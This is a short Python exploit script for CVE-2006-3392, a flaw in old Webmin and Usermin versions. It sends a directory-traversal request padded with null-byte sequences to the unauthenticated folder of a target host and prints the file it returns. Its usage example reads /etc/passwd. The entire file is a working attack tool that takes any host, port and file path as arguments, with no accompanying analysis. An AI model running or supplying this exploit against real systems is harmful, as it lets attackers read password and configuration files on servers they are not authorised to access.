#!/usr/bin/env python3

# Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure.
# Its due to a flaw in unauthenticated folder which leads to Directory traversal with null byte or any hex value.
# CVE-2006-3392 

import requests
import sys


def webmin(ip, port, http_https, file):
    session = requests.session()
    try:
        web = session.get("{}://{}:{}".format(http_https, ip, port) + "/unauthenticated/" + "..%00/" * 10 + "..%00" + "{}".format(file)).text
        print("\n" + web + "\n")
    except Exception:
        print("\n Connection not working, You might have entered the ip or port incorrect, Check the arguments again \n")


if __name__ == '__main__':
    if len(sys.argv[1:]) < 4:
        print("\n Usage:python3 webmin.py <host-ip> <port> <http-or-https> <file-path> \n")
        print("\n Example: python3 webmin.py localhost 10000 http /etc/passwd \n")
    else:
        ip = sys.argv[1].strip()
        port = sys.argv[2].strip()
        http_https = sys.argv[3].strip()
        file = sys.argv[4].strip()
        webmin(ip, port, http_https, file)
